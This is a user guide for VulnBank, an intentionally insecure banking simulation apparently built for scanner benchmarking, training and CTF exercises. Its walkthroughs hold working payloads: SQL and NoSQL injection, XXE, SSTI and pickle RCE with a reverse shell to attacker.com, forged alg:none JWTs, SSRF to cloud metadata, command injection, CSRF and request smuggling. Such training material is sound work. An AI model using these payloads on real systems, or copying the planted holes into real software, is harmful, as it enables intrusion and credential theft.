# VulnBank Technical User Guide

> **Version:** v7.0.0 | **Last Updated:** 2026-06-26 | **Maintained with each release**

> ⚠️ **WARNING: This application is intentionally insecure. Never deploy to any public-facing or production environment. Never use real credentials, personal data, or financial information.**

---

## Table of Contents

1. [Purpose & Scope](#1-purpose--scope)
2. [Architecture](#2-architecture)
3. [Installation](#3-installation)
4. [Service Map](#4-service-map)
5. [Default Credentials](#5-default-credentials)
6. [Vulnerability Index](#6-vulnerability-index)
7. [Exploit Walkthroughs](#7-exploit-walkthroughs)
8. [CTF Mode](#8-ctf-mode)
9. [Node.js Microservice (Port 3000)](#9-nodejs-microservice-port-3000)
10. [HTTP Request Smuggling](#10-http-request-smuggling)
11. [Using VulnBank with SecureScope](#11-using-vulnbank-with-securescope)
12. [Firebase Tracking](#12-firebase-tracking)
13. [Safe Reset](#13-safe-reset)
14. [Version History](#14-version-history)

---

## 1. Purpose & Scope

VulnBank is a purpose-built, intentionally insecure banking simulation. It is the primary test target for [SecureScope](https://github.com/OmarRao/secure-scope) and is designed to be used for:

- **Static analysis validation** — confirm that Semgrep, CodeQL, Bandit, Snyk, and similar tools detect the expected findings
- **AI scanner benchmarking** — measure SecureScope's detection rate and false-positive rate against a known ground truth
- **Security training** — give developers hands-on experience exploiting real vulnerability patterns in a controlled sandbox
- **Purple-team exercises** — let red teams demonstrate impact and blue teams practice detection

**What VulnBank is NOT:**
- A reference implementation of secure banking software
- Safe to expose to any network other than localhost
- Suitable for processing real financial data

VulnBank contains **500+ deliberately introduced security findings** across **28 CWE categories**, annotated with CWE, MITRE ATT&CK v14, OWASP Top 10 / API Top 10 / LLM Top 10, PCI DSS v4.0, NIST SP 800-53 Rev 5, ISO 27001:2022 Annex A, and SANS/CWE Top 25.

---

## 2. Architecture

```
                    ┌─────────────────────────────────────────────┐
                    │              VulnBank Stack                 │
                    │                                             │
  Browser ──────▶  │  nginx (port 80)                            │
                    │    │                                         │
                    │    ▼                                         │
                    │  Flask app.py (port 5000)                   │
                    │    │                                         │
                    │    ├── /login, /dashboard, /transfer        │
                    │    ├── /admin/* (OS command injection)      │
                    │    ├── /api/auth     (SQLi, CSRF, JWT)      │
                    │    ├── /api/accounts (IDOR, SSRF, CMDi)     │
                    │    ├── /api/files    (upload, traversal)    │
                    │    ├── /api/graphql  (SQLi, introspect)     │
                    │    ├── /api/jwt      (alg:none, confusion)  │
                    │    ├── /api/ldap     (injection, anon bind) │
                    │    ├── /api/nosql    (MongoDB injection)     │
                    │    └── /api/ctf      (flag submission)      │
                    │    │                                         │
                    │    ├── SQLite (vulnbank.db)                 │
                    │    │                                         │
                    │    └── MongoDB (port 27017, no auth)        │
                    │                                             │
                    │  Node.js microservice (port 3000)           │
                    │    └── 5 additional vulnerabilities         │
                    │                                             │
                    │  MailHog SMTP catcher (port 8025)           │
                    └─────────────────────────────────────────────┘
```

**File layout:**

```
VulnBank/
├── app.py                    Core Flask app — auth, dashboard, admin, transfers
├── config.py                 Hardcoded secrets, weak JWT config
├── models.py                 ORM-style models with injection-prone raw SQL
├── utils.py                  Shared utilities — XXE, weak crypto, path traversal
│
├── api/
│   ├── auth.py               Login, register, MFA bypass, SAML XXE, OAuth SSRF
│   ├── accounts.py           Account management — IDOR, CMDi, SSRF
│   ├── admin.py              Admin panel — unauthenticated, mass SQLi, pickle RCE
│   ├── files.py              File upload/download — unrestricted upload, traversal
│   ├── loans.py              Loan API — business logic abuse, injection
│   ├── payments.py           Payment processing — CSRF, race conditions
│   ├── reports.py            Reporting — CSV injection, XSS, path traversal
│   ├── transactions.py       Transaction history — IDOR, injection
│   ├── users.py              User management — mass assignment, enumeration
│   ├── oauth.py              OAuth misconfig — open redirect, SSRF, hardcoded secret
│   ├── mfa.py                2FA bypass — master code, no lockout, weak entropy
│   ├── passwordreset.py      Reset poisoning — Host header injection, token replay
│   ├── graphql_api.py        GraphQL — SQLi resolvers, introspection, DoS, IDOR
│   ├── jwt_auth.py           JWT confusion — alg:none, HS256/RS256 swap, kid SQLi
│   ├── ldap.py               LDAP injection — filter bypass, anonymous search
│   ├── xxe.py                XXE endpoints
│   ├── ssti.py               SSTI endpoints
│   ├── idor.py               IDOR endpoints
│   ├── business_logic.py     Business logic flaws
│   ├── deserialization.py    Pickle RCE endpoints
│   ├── nosql.py              NoSQL injection (MongoDB)
│   └── ctf.py                CTF flag submission system
│
├── services/
│   ├── crypto_service.py     MD5, weak keys, ECB mode, hardcoded IV
│   ├── email.py              Header injection, SSRF
│   ├── logger.py             Log injection, sensitive data in logs
│   ├── notification.py       SSRF, template injection
│   └── search.py             SQL injection, SSRF, XXE
│
├── middleware/
│   └── auth.py               JWT confusion, bypass, weak secret
│
├── jobs/
│   └── scheduled.py          Command injection, path traversal in cron jobs
│
├── microservice/             Node.js service (port 3000)
│   ├── index.js              5 vulnerability classes
│   └── Dockerfile
│
└── utils/
    ├── formatters.py         XSS, CSV injection, SSTI
    └── validators.py         Bypass patterns, regex DoS
```

---

## 3. Installation

### Method 1: Docker Compose (recommended)

Docker Compose starts the full stack: Flask app, nginx reverse proxy, MongoDB, Node.js microservice, and MailHog email catcher.

```powershell
git clone https://github.com/OmarRao/analyzer.git
cd analyzer
docker-compose up
```

Once running:
- Flask app: http://localhost:5000
- nginx proxy: http://localhost:80
- Node.js microservice: http://localhost:3000
- MailHog (catches password reset emails): http://localhost:8025
- MongoDB: localhost:27017 (no auth)

### Method 2: Local (Python only, no Docker)

```powershell
git clone https://github.com/OmarRao/analyzer.git
cd analyzer
pip install -r requirements.txt
python app.py
# App available at http://localhost:5000
```

The SQLite database (`vulnbank.db`) is created automatically on first run.

### Method 3: pip + Docker for full stack

```powershell
# Run Flask app locally:
pip install -r requirements.txt
python app.py &

# Run only MongoDB and MailHog via Docker:
docker-compose up mongodb mailhog
```

> ⚠️ **Warning:** `app.py` runs with `debug=True` and `host="0.0.0.0"`. This is intentional (CWE-94/209 demonstration) — ensure your firewall blocks port 5000 from external access.

---

## 4. Service Map

| Service | Port | Protocol | Purpose | Vulnerabilities |
|---------|------|----------|---------|----------------|
| Flask (vulnbank) | 5000 | HTTP | Core banking application | All CWE categories |
| nginx | 80 | HTTP | Reverse proxy | HTTP request smuggling (TE.CL) |
| Node.js microservice | 3000 | HTTP | Secondary API | 5 additional vulnerability classes |
| MongoDB | 27017 | TCP | NoSQL store | CWE-521 (no auth), NoSQL injection targets |
| MailHog (SMTP) | 1025 | SMTP | Email catch-all | Captures password reset tokens |
| MailHog (UI) | 8025 | HTTP | Email web UI | View captured reset emails |

---

## 5. Default Credentials

VulnBank ships with three hardcoded user accounts (CWE-798 — intentional):

| Username | Password | Role | Balance | Weakness Demonstrated |
|----------|----------|------|---------|----------------------|
| `admin` | `admin123` | admin | $999,999 | Trivially guessable admin password |
| `alice` | `password1` | user | $1,500 | Common dictionary password |
| `bob` | `letmein` | user | $800 | OWASP worst-passwords list |

**Why these are weak:**
- All three appear in every major password breach dump and rainbow table
- `admin123` is the single most common default admin credential across enterprise software
- None meet NIST SP 800-63B requirements for minimum entropy
- Stored in the database as plaintext (or MD5 after calling `/reset-password`) — neither is acceptable

These credentials are seeded at startup by `init_db()` using `INSERT OR IGNORE` — they survive restarts unless the database is deleted.

---

## 6. Vulnerability Index

### Injection

| CWE | Name | MITRE ATT&CK | OWASP | Endpoints |
|-----|------|--------------|-------|-----------|
| CWE-89 | SQL Injection | T1190 | A03:2021 | `/login`, `/search`, `/dashboard`, `/transfer`, `/profile/<u>`, `/api/transactions/<id>`, `/api/transfer/bulk`, `/api/transfer/negative` |
| CWE-78 | OS Command Injection | T1059 | A03:2021 | `/admin/ping`, `/admin/run` |
| CWE-79 | Reflected XSS | T1059.007 | A03:2021 | `/search` |
| CWE-94 | SSTI (Jinja2) | T1059 | A03:2021 | `/notify`, `/api/ssti/render` |
| CWE-611 | XXE | T1190 | A05:2021 | `/api/import/statement`, `/api/xml/parse` |
| CWE-1236 | CSV / Formula Injection | T1059 | A03:2021 | `/api/reports/*` |
| CWE-113 | HTTP Response Splitting | T1566 | A01:2021 | `/api/redirect` |
| CWE-90 | LDAP Injection | T1190 | A03:2021 | `/api/ldap/login`, `/api/ldap/search` |

### Authentication & Access Control

| CWE | Name | MITRE ATT&CK | OWASP | Endpoints |
|-----|------|--------------|-------|-----------|
| CWE-798 | Hardcoded Credentials | T1552.001 | A02:2021 | `app.py` globals, `config.py`, `api/oauth.py` |
| CWE-285 | BOLA / IDOR | T1548 | API1:2023 | `/api/transactions/<id>`, `/api/accounts/<id>`, `/api/idor/*` |
| CWE-347 | JWT Algorithm Confusion | T1552 | API2:2023 | `/api/token/verify`, `/api/jwt/*` |
| CWE-284 | Missing Authentication on Admin | T1548 | A01:2021 | `/admin/run`, `/admin/ping`, `/admin/logs` |
| CWE-208 | Timing Attack / Username Enumeration | T1590 | A07:2021 | `/api/auth/login`, `/api/passwordreset/request` |
| CWE-915 | Mass Assignment | T1548 | API3:2023 | `/api/users/update`, `/api/settings/merge` |
| CWE-307 | No Brute-Force Lockout (MFA) | T1110 | A07:2021 | `/api/mfa/verify` |

### Cryptography

| CWE | Name | MITRE ATT&CK | OWASP | Endpoints |
|-----|------|--------------|-------|-----------|
| CWE-327 | Weak Cryptography (MD5, ECB) | T1600 | A02:2021 | `/reset-password`, `services/crypto_service.py` |
| CWE-916 | Insufficient Password Hashing | T1600 | A02:2021 | `/reset-password`, `api/auth.py` |
| CWE-330 | Weak Randomness / Predictable Tokens | T1552 | A02:2021 | `api/passwordreset.py`, `api/mfa.py` |
| CWE-312 | Cleartext Storage of Sensitive Data | T1552 | A02:2021 | `services/logger.py` |

### Server-Side & Network

| CWE | Name | MITRE ATT&CK | OWASP | Endpoints |
|-----|------|--------------|-------|-----------|
| CWE-918 | SSRF | T1090 | A10:2021 | `/api/fetch`, `api/oauth.py`, `api/jwt_auth.py` |
| CWE-22 | Path Traversal | T1083 | A01:2021 | `/admin/logs`, `api/files.py` |
| CWE-601 | Open Redirect | T1566 | A01:2021 | `/api/redirect`, `api/oauth.py` |
| CWE-434 | Unrestricted File Upload | T1190 | A04:2021 | `api/files.py` |
| CWE-942 | Permissive CORS | T1090 | A05:2021 | `/api/account/balance` |

### Application Logic

| CWE | Name | MITRE ATT&CK | OWASP | Endpoints |
|-----|------|--------------|-------|-----------|
| CWE-352 | Missing CSRF | T1562 | A01:2021 | `/transfer` |
| CWE-502 | Pickle RCE | T1059 | A08:2021 | `/api/restore`, `api/deserialization.*` |
| CWE-362 | Race Condition (TOCTOU) | T1499 | API4:2023 | `/transfer`, `/api/transfer/bulk` |
| CWE-840 | Business Logic — Negative Transfer | T1548 | API3:2023 | `/api/transfer/negative` |
| CWE-532 | Sensitive Data in Logs | T1552 | A09:2021 | `services/logger.py` |
| CWE-209 | Verbose Error Messages | T1590 | A05:2021 | `app.py` debug mode |
| CWE-1321 | Prototype Pollution | T1059 | API3:2023 | `/api/settings/merge` |
| CWE-1333 | ReDoS | T1499 | A05:2021 | `/api/validate/email` |

### Emerging Threat Classes

| Category | Vulnerability | Standard | Endpoint |
|----------|--------------|----------|---------|
| LLM Security | Prompt Injection | OWASP LLM01:2025 | `/api/ai/advice` |
| API Security | GraphQL introspection + SQLi | OWASP API9:2023 | `/api/graphql` |
| OAuth | `redirect_uri` not validated | CWE-601 | `/api/oauth/callback` |
| 2FA | Hardcoded master bypass `000000` | CWE-798 | `/api/mfa/verify` |
| Password Reset | Host header injection | CWE-20 | `/api/passwordreset/request` |

---

## 7. Exploit Walkthroughs

> ⚠️ **All exploits below target localhost only. Never test against systems you do not own.**

### 7.1 SQL Injection — Login Bypass (CWE-89)

The `/login` endpoint builds its query with string formatting: `f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"`.

```bash
# Classic ' OR '1'='1 login bypass
curl -s http://localhost:5000/login \
  -X POST \
  -d "username=admin'--&password=wrong"
# Expected: redirects to /dashboard — login succeeded without correct password

# Via the JSON API endpoint:
curl -s http://localhost:5000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin'\''--", "password": "x"}'
# Expected: 200 OK with JWT token (bypass succeeded)

# Union-based data extraction:
curl -s "http://localhost:5000/search?q=' UNION SELECT username,password FROM users--"
# Expected: Returns all usernames and passwords from the database
```

**Root cause:** `f"SELECT * FROM users WHERE username='{username}'"` — user input interpolated directly into SQL. Fix: use parameterised queries `conn.execute("SELECT * FROM users WHERE username=?", (username,))`.

### 7.2 IDOR — Access Another User's Data (CWE-285)

`/api/transactions/<id>` returns any transaction by sequential integer ID with no ownership check.

```bash
# Login as alice first to get a session cookie:
curl -s -c cookies.txt http://localhost:5000/login \
  -X POST -d "username=alice&password=password1"

# Access your own transaction (ID 1):
curl -s -b cookies.txt http://localhost:5000/api/transactions/1

# Access admin's transaction (ID you should not see):
curl -s -b cookies.txt http://localhost:5000/api/transactions/99
# Expected: Returns transaction 99's data regardless of ownership

# IDOR on accounts endpoint:
curl -s http://localhost:5000/api/accounts/2 \
  -H 'X-User-Id: 1'
# Expected: Returns account 2's balance and details (should be forbidden)
```

**Root cause:** No `WHERE user_id = session['user_id']` clause in the transaction query. The endpoint trusts the URL parameter rather than enforcing ownership.

### 7.3 XXE — File Read via XML External Entity (CWE-611)

`/api/import/statement` passes untrusted XML to `ET.fromstring()` with the default parser, which resolves external entities.

```bash
curl -s http://localhost:5000/api/import/statement \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<statement><account>&xxe;</account></statement>'
# Expected: Contents of /etc/passwd appear in the "account" field of the JSON response

# SSRF via XXE — access internal metadata:
curl -s http://localhost:5000/api/import/statement \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<statement><account>&xxe;</account></statement>'
# Expected: AWS instance metadata (in cloud environments)
```

**Root cause:** Python's `xml.etree.ElementTree` resolves external entities by default. Fix: use `defusedxml` library or disable entity resolution via `ET.XMLParser(resolve_entities=False)`.

### 7.4 SSTI — Server-Side Template Injection (CWE-94)

`/notify` renders user-supplied `msg` as a Jinja2 template directly: `env.from_string(f"Notification: {msg}")`.

```bash
# Confirm template execution (7*7 = 49):
curl -s "http://localhost:5000/notify?msg={{7*7}}"
# Expected: "Notification: 49" — proves expressions are evaluated

# Leak the Flask secret key:
curl -s "http://localhost:5000/notify?msg={{config.SECRET_KEY}}"
# Expected: "Notification: supersecretkey123"

# Full RCE via subclass chain (read /etc/passwd):
curl -s "http://localhost:5000/notify?msg={{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].decode()}}"
# Expected: Contents of /etc/passwd

# Via the dedicated SSTI endpoint:
curl -s "http://localhost:5000/api/template/render?name={{7*7}}"
# Expected: "49" rendered in response

curl -s "http://localhost:5000/api/ssti/render?template={{config.SECRET_KEY}}"
# Expected: Flask secret key leaked
```

**Root cause:** User input concatenated into the template string before parsing. Fix: never pass user input to `from_string()` or `render_string()` — use `render_template()` with variables passed as context, not interpolated into the template source.

### 7.5 Pickle RCE — Insecure Deserialization (CWE-502)

`/api/restore` calls `pickle.loads()` on the raw request body — any pickled object is instantiated, including ones with `__reduce__` hooks that execute OS commands.

```python
# exploit_pickle.py — run this on your machine:
import pickle, os, base64, requests

class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = pickle.dumps(RCE())
r = requests.post('http://localhost:5000/api/restore',
                  data=payload,
                  headers={'Content-Type': 'application/octet-stream'})
print(r.text)
# Expected: Command "id" executed server-side; /tmp/pwned contains output

# Reverse shell payload:
class Shell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &',))

payload = pickle.dumps(Shell())
requests.post('http://localhost:5000/api/restore', data=payload)
```

**Root cause:** `pickle` is an arbitrary code execution primitive — never deserialise pickle data from untrusted sources. Fix: use JSON, MessagePack, or sign+verify the serialised blob before deserialising.

### 7.6 NoSQL Injection — MongoDB Authentication Bypass (CWE-89 / MongoDB)

`/api/nosql/login` passes the JSON body directly to a MongoDB `find_one()` query without sanitisation, allowing operator injection.

```bash
# Normal login attempt:
curl -s http://localhost:5000/api/nosql/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin", "password": "wrongpassword"}'
# Expected: 401 Unauthorized

# NoSQL injection — $ne operator matches any non-empty password:
curl -s http://localhost:5000/api/nosql/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin", "password": {"$ne": ""}}'
# Expected: 200 OK with session token — login bypassed

# $regex operator to enumerate users:
curl -s http://localhost:5000/api/nosql/login \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$regex": "^a"}, "password": {"$ne": ""}}'
# Expected: Logs in as first user whose username starts with "a"
```

**Root cause:** MongoDB queries accept BSON operators embedded in documents. When user-supplied JSON is passed directly to `find_one({"username": username, "password": password})`, a dict for `password` is treated as a query operator. Fix: validate that `password` is a string before querying, or use a proper ODM.

### 7.7 Business Logic — Negative Transfer (CWE-840)

`/api/transfer/negative` processes transfers without validating that `amount > 0`. Sending a negative amount reverses the direction of the transfer.

```bash
# Login as alice first:
curl -s -c cookies.txt http://localhost:5000/login \
  -X POST -d "username=alice&password=password1"

# Normal transfer: alice sends $100 to bob — alice loses $100
curl -s -b cookies.txt http://localhost:5000/api/transfer/negative \
  -X POST -d "to=bob&amount=100"

# Negative transfer: alice sends -$500 to bob
# Effect: alice GAINS $500, bob LOSES $500 (money stolen from bob)
curl -s -b cookies.txt http://localhost:5000/api/transfer/negative \
  -X POST -d "to=bob&amount=-500"
# Expected: {"status": "transfer complete", "amount": "-500", "to": "bob"}
# alice's balance: +$500  |  bob's balance: -$500

# Interest calculation with negative rate:
curl -s "http://localhost:5000/api/interest/calculate?principal=10000&rate=-10&years=5"
# Expected: Negative interest value — bank "owes" user money
```

**Root cause:** `UPDATE users SET balance = balance - {amount}` — when amount is negative, the subtraction becomes addition for the sender. Fix: validate `amount > 0` and check sender has sufficient balance before executing.

### 7.8 JWT Algorithm Confusion (CWE-347)

`/api/token/verify` accepts tokens with `"alg": "none"` — no signature required — allowing attackers to forge tokens claiming any identity.

```bash
# Step 1: Create a forged JWT with alg:none
python3 -c "
import base64, json

header = base64.urlsafe_b64encode(
    json.dumps({'alg':'none','typ':'JWT'}).encode()
).rstrip(b'=').decode()

payload = base64.urlsafe_b64encode(
    json.dumps({'user':'admin','role':'admin','user_id':1}).encode()
).rstrip(b'=').decode()

print(f'{header}.{payload}.')
"
# Output: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4iLCAidXNlcl9pZCI6IDF9.

# Step 2: Submit the forged token:
curl -s http://localhost:5000/api/token/verify \
  -H 'Content-Type: application/json' \
  -d '{"token": "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4iLCAidXNlcl9pZCI6IDF9."}'
# Expected: {"valid": true, "payload": {"user": "admin", "role": "admin"}}

# Use the forged token in Authorization header:
curl -s http://localhost:5000/api/protected-endpoint \
  -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4iLCAidXNlcl9pZCI6IDF9.'
```

**Root cause:** `if alg == "none": return jsonify({"valid": True})` — the server accepts unsigned tokens. Fix: whitelist `HS256` (or the expected algorithm) and reject all others; use a library like `PyJWT` with `algorithms=["HS256"]` and a strong secret.

### 7.9 SSRF — Server-Side Request Forgery (CWE-918)

`/api/fetch` fetches any URL provided by the user, including internal services and cloud metadata endpoints.

```bash
# Read cloud metadata (AWS IMDSv1):
curl -s "http://localhost:5000/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# Expected: AWS instance metadata list

# Read IAM credentials:
curl -s "http://localhost:5000/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Expected: IAM role name and temporary credentials

# Access internal services:
curl -s "http://localhost:5000/api/fetch?url=http://localhost:27017/"
# Expected: MongoDB response — confirms internal port reachability

# SSRF to MailHog API:
curl -s "http://localhost:5000/api/fetch?url=http://mailhog:8025/api/v2/messages"
# Expected: All captured emails including password reset tokens
```

### 7.10 OS Command Injection (CWE-78)

`/admin/ping` runs `ping -c 1 {host}` with `shell=True` and no sanitisation.

```bash
# Normal ping:
curl -s "http://localhost:5000/admin/ping?host=localhost"

# Command injection via semicolon:
curl -s "http://localhost:5000/admin/ping?host=localhost;id"
# Expected: ping output followed by output of "id" command

# Read sensitive files:
curl -s "http://localhost:5000/admin/ping?host=localhost;cat /etc/passwd"

# Direct command execution via /admin/run (no auth):
curl -s http://localhost:5000/admin/run \
  -X POST -d "cmd=id"
# Expected: {"output": "uid=0(root) gid=0(root) groups=0(root)"}
```

### 7.11 Path Traversal (CWE-22)

`/admin/logs` reads `/var/log/{filename}` where `filename` comes from the URL parameter.

```bash
# Normal log read:
curl -s "http://localhost:5000/admin/logs?file=app.log"

# Path traversal — read /etc/passwd:
curl -s "http://localhost:5000/admin/logs?file=../../etc/passwd"
# Expected: Contents of /etc/passwd

# Read application source:
curl -s "http://localhost:5000/admin/logs?file=../../app/app.py"
# Expected: Full source code of app.py
```

### 7.12 CSRF — Cross-Site Request Forgery (CWE-352)

The `/transfer` endpoint processes POST requests with no CSRF token. Any page can initiate a transfer on behalf of a logged-in user.

```html
<!-- evil.html — host this on an attacker-controlled site -->
<html><body onload="document.forms[0].submit()">
  <form method="POST" action="http://localhost:5000/transfer">
    <input name="to" value="attacker_account">
    <input name="amount" value="1000">
  </form>
</body></html>
```

When a logged-in VulnBank user visits this page, $1000 is transferred without their knowledge.

---

## 8. CTF Mode

VulnBank includes a built-in CTF (Capture The Flag) system for structured training exercises and competitions.

```bash
# List all available flags and their categories:
curl http://localhost:5000/api/ctf/flags
# Returns: array of {id, category, hint_url, points}

# Submit a found flag:
curl -s http://localhost:5000/api/ctf/submit \
  -H 'Content-Type: application/json' \
  -d '{"team": "red-team", "flag": "FLAG{sql_1nj3ct10n_m4st3r}"}'
# Expected: {"status": "correct", "points": 100, "total": 100}

# Check the scoreboard:
curl http://localhost:5000/api/ctf/scoreboard
# Returns: ranked teams with points and flags captured

# Get a hint for a category:
curl http://localhost:5000/api/ctf/hints/sqli
curl http://localhost:5000/api/ctf/hints/pickle
curl http://localhost:5000/api/ctf/hints/jwt
```

### CTF Flag Index

| # | Flag | Category | Points | Endpoint That Yields It |
|---|------|----------|--------|------------------------|
| 1 | `FLAG{sql_1nj3ct10n_m4st3r}` | SQL Injection | 100 | `/login` — bypass with `' OR '1'='1'--` |
| 2 | `FLAG{1d0r_h0r1z0ntal_trav3rsal}` | IDOR | 100 | `/api/transactions/1` — access another user's data |
| 3 | `FLAG{xxe_f1l3_r3ad_m4st3r}` | XXE | 150 | `/api/import/statement` — read `/etc/passwd` via entity |
| 4 | `FLAG{sst1_t3mplat3_3xecut10n}` | SSTI | 150 | `/notify` — execute `{{7*7}}` then escalate to RCE |
| 5 | `FLAG{p1ckl3_rce_ch4mp10n}` | Pickle RCE | 200 | `/api/restore` — deserialise malicious pickle payload |
| 6 | `FLAG{n0sql_1nj3ct10n_b3at}` | NoSQL Injection | 150 | `/api/nosql/login` — `$ne` operator bypass |
| 7 | `FLAG{jwt_n0n3_alg_byp4ss}` | JWT Confusion | 150 | `/api/token/verify` — forge alg:none token |
| 8 | `FLAG{ssrf_1nt3rnal_n3tw0rk}` | SSRF | 100 | `/api/fetch` — access cloud metadata or internal services |
| 9 | `FLAG{csrf_s1l3nt_transf3r}` | CSRF | 100 | `/transfer` — submit cross-origin form without token |
| 10 | `FLAG{n3g4tiv3_bal4nc3_th3ft}` | Business Logic | 200 | `/api/transfer/negative` — negative amount steals funds |
| 11 | `FLAG{s3cr3t_k3y_3xp0s3d}` | Hardcoded Secrets | 50 | `app.py` source — find the `secret_key` value |

---

## 9. Node.js Microservice (Port 3000)

The `microservice/` directory contains a separate Node.js Express service with five additional vulnerability classes.

Start it via Docker Compose (`docker-compose up vulnbank-node`) or standalone:

```powershell
cd microservice
npm install
node index.js
# Running at http://localhost:3000
```

### 9.1 Prototype Pollution

```bash
# Pollute Object.prototype via JSON merge:
curl -s http://localhost:3000/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"isAdmin": true, "polluted": "yes"}}'
# Expected: 200 OK — prototype chain modified server-side

# Verify pollution:
curl -s http://localhost:3000/api/check-admin
# Expected: {"admin": true} — even for unprivileged sessions
```

### 9.2 Command Injection via `child_process`

```bash
curl -s "http://localhost:3000/api/exec?cmd=id"
# Expected: uid=... — direct command execution
```

### 9.3 Path Traversal

```bash
curl -s "http://localhost:3000/api/file?path=../../package.json"
# Expected: Contents of package.json (../../ traversal)
```

### 9.4 Open Redirect

```bash
curl -sv "http://localhost:3000/api/redirect?url=https://example.com" 2>&1 | grep Location
# Expected: Location: https://example.com — unvalidated redirect
```

### 9.5 Unvalidated Dependency (Event Stream / Supply Chain Simulation)

```bash
curl -s http://localhost:3000/api/supply-chain-demo
# Expected: Output demonstrating a simulated malicious package execution
```

---

## 10. HTTP Request Smuggling

The nginx configuration in `nginx.conf` is deliberately misconfigured to demonstrate CL.TE (Content-Length / Transfer-Encoding) request smuggling.

### How It Works

nginx forwards requests to the Flask backend over HTTP/1.1. When both `Content-Length` and `Transfer-Encoding: chunked` headers are present, nginx and Flask disagree about where one request ends and the next begins.

### TE.CL Attack (Transfer-Encoding frontend, Content-Length backend)

```bash
# Using netcat to send the raw smuggled request:
printf 'POST / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n12\r\nGET /admin HTTP/1.1\r\nFoo: x\r\n\r\n0\r\n\r\n' | nc localhost 80
```

The second request (`GET /admin`) is "smuggled" — it is prepended to the next legitimate request processed by Flask, potentially causing the backend to serve admin content to another user or bypass access controls.

### Detection

Look for unexpected responses to innocent-looking requests, particularly if they contain content from a different endpoint. Use Burp Suite's HTTP request smuggler extension for automated detection.

---

## 11. Using VulnBank with SecureScope

VulnBank is the canonical test target for SecureScope. A scan of the public repository should produce 500+ findings across all supported vulnerability categories.

```powershell
# Scan VulnBank with SecureScope — static analysis only (no Docker required):
python path\to\secure-scope\main.py `
  --repo https://github.com/OmarRao/analyzer `
  --no-sandbox `
  --sarif --sbom --compliance `
  --secret-scan --iac-scan --polyglot `
  --out-dir ./vulnbank-scan

# Full scan with AI fix advisories:
$env:ANTHROPIC_API_KEY = "sk-ant-..."
python path\to\secure-scope\main.py `
  --repo https://github.com/OmarRao/analyzer `
  --no-sandbox `
  --sarif --sbom --compliance `
  --secret-scan --iac-scan `
  --out-dir ./vulnbank-scan
```

**Expected findings breakdown:**

| Category | Expected Count |
|----------|---------------|
| SQL Injection (CWE-89) | 25+ findings |
| Hardcoded secrets (CWE-798) | 15+ findings |
| OS Command Injection (CWE-78) | 8+ findings |
| Weak cryptography (CWE-327/916) | 12+ findings |
| SSRF (CWE-918) | 6+ findings |
| Path traversal (CWE-22) | 8+ findings |
| XSS (CWE-79) | 10+ findings |
| Insecure deserialization (CWE-502) | 5+ findings |
| Debug mode enabled | 3+ findings |
| SSTI (CWE-94) | 4+ findings |
| JWT vulnerabilities (CWE-347) | 8+ findings |
| All other categories | 400+ additional |
| **Total** | **500+** |

The scan validates that SecureScope detects the full spectrum of vulnerability classes. Use the JSON report to compare detected-vs-expected for precision/recall benchmarking.

---

## 12. Firebase Tracking

VulnBank optionally integrates with Firebase Analytics to track exploit attempts for training analytics. This is disabled by default and requires explicit configuration.

**What is tracked (when enabled):**
- Which CTF flags were captured and when
- Which endpoints received exploit payloads
- Team IDs and scores on the CTF scoreboard

**What is never tracked:**
- Actual payload content
- IP addresses or personal information
- Any data outside the CTF system

**Configuration (optional):**

```powershell
$env:FIREBASE_API_KEY = "AIza..."
$env:FIREBASE_PROJECT_ID = "vulnbank-ctf"
$env:FIREBASE_ENABLED = "1"
python app.py
```

If these environment variables are not set, Firebase tracking is silently disabled.

---

## 13. Safe Reset

### Docker (recommended)

```powershell
# Full reset — destroys all data volumes and recreates from scratch:
docker-compose down -v
docker-compose up

# Soft reset — restart without destroying persistent data:
docker-compose restart vulnbank
```

### Manual (SQLite reset)

```powershell
# Delete the SQLite database and reinitialise:
Remove-Item vulnbank.db -ErrorAction SilentlyContinue
python -c "from app import app, init_db; ctx = app.app_context(); ctx.push(); init_db()"

# Or use the Python context manager:
python -c "
from app import app, db
with app.app_context():
    db.drop_all()
    db.create_all()
print('Database reset complete')
"
```

### MongoDB reset (Docker Compose)

```powershell
# Drop and recreate the MongoDB volume:
docker-compose down -v mongodb
docker-compose up -d mongodb
```

After reset, the three default users (admin/admin123, alice/password1, bob/letmein) are re-seeded automatically when `app.py` starts.

---

## 14. Version History

| Version | Date | Highlights |
|---------|------|------------|
| v7.0.0 | 2026-06-26 | CTF flag system, Node.js microservice, HTTP request smuggling (nginx), Firebase tracking, comprehensive user guide |
| v6.0.0 | 2026-06-24 | LDAP injection, OAuth misconfiguration, 2FA bypass, password reset poisoning, GraphQL vulnerabilities, JWT algorithm confusion, Docker Compose full stack, GitHub Actions CI, Postman collection (35 exploit requests) |
| v5.0.0 | 2026-06-23 | Full 6-framework annotation — ISO 27001:2022 Annex A added to all 14 api/utils/jobs/config/models files; new CWE-362 race-condition endpoints; CWE-840 negative-transfer business logic flaw |
